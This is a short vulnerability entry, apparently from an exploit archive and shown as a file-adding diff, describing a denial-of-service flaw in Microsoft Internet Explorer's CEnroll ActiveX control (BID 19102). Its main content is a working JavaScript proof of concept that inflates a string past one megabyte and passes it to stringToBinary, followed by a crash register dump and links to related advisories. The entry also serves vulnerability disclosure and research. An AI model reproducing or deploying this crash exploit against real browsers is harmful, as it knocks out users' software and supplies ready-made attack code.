@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/19102/info
+
+Microsoft Internet Explorer is prone to a denial-of-service vulnerability because the application fails to properly bounds-check user-supplied input.
+
+Remote attackers can exploit this issue to crash the application, causing a denial-of-service.
+
+<a href='http://browserfun.blogspot.com/2006/07/mobb-8-rdsdatacontrol-url.html'> MoBB #8</a>.<br /><br />var a = new ActiveXObject('CEnroll.CEnroll.2'); <br />var b = 'BOOM';<br />while (b.length <= 1024*1024) b+=b;<br />a.stringToBinary(1, b);<br /><br /> <a href="http://metasploit.com/users/hdm/tools/browserfun/mobb_021.html" target="_new">Demonstration</a> <br /><br />eax=03580024 ebx=00300000 ecx=0005fc08<br />edx=00300000 esi=03571000 edi=03701004<br /> eip=77124ba4 esp=0013b200 ebp=0013b20c<br />OLEAUT32!SysAllocStringLen+0x4f:<br />77124ba4 f3a5 rep movsd ds:03571000=???????? es:03701004=00000000<br /><br />This bug will be added to the OSVDB:<br /> <a href="http://osvdb.org/27230">Microsoft IE CEnroll SysAllocStringLen Invalid Length</a>
